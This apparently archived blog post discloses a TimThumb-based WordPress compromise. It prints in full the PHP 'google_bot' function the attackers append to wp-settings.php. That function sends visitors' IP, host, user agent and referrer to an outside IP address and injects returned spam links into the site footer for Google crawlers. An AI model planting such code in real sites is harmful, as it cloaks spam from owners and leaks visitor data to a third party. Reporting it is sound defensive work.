---
layout: post
title: TimThumb attack now changing wp-settings.php
categories:
- Blog
tags:
- hack
- TimThumb
- Wordpress
status: publish
type: post
published: true
meta:
  _syntaxhighlighter_encoded: '1'
  dsq_thread_id: '394911721'
  _edit_last: '1'
---
The TimThumb attack seems to continue, now changing the <em>wp-settings.php</em> file.

This function is added to the end of the file:

[code lang="php" wraplines="true"]
function google_bot() {
	$sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
	if(!(strpos($sUserAgent, 'google') === false)) {
		if(isset($_SERVER['REMOTE_ADDR']) == true &amp;&amp; isset($_SERVER['HTTP_HOST']) == true){
			$ch = curl_init('http://91.196.216.30/bot.php?ip='
.$_SERVER['REMOTE_ADDR'].'&amp;host='.$_SERVER['HTTP_HOST'].'&amp;ua='
.urlencode($_SERVER['HTTP_USER_AGENT']).'&amp;ref='
.$_SERVER['HTTP_REFERER']);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_TIMEOUT, 10);
			$re = curl_exec($ch);
			curl_close($ch);
			echo $re;
		}
	}
}
add_action('wp_footer', 'google_bot');
[/code]

According to WordPress API that will add the output of the function 'google_bot' to the bottom of your site. The output is 2 lines of SPAM that come from this URL: http:// 91.196.216.30 / bot.php

They all seem to point to 2 websites:
<ul>
	<li>albertasportswear .com</li>
	<li>bettyoctopus .com</li>
</ul>

<h1>Recent Updates</h1>
<ol>
	<li><span class="Apple-style-span" style="font-weight: normal;"><strong>24.08.2010:</strong> Some blogs got the <em>wp-config.php</em> modified.</span></li>
	<li>After reinstalling, I still got this <strong>PHP Warning</strong>:  parse_url(/wp-content/themes/Boutique/thumb.php?src=http://blogger.com.bloggera[dot]net/images.php) [&#60;a href='function.parse-url'&#62;function.parse-url&#60;/a&#62;]: Unable to parse URL in /MY_WEBSITE_PATH/wp-content/plugins/permalink-editor/index.php on line 235</li>
</ol>
- <strong>Luis Ramalho</strong>
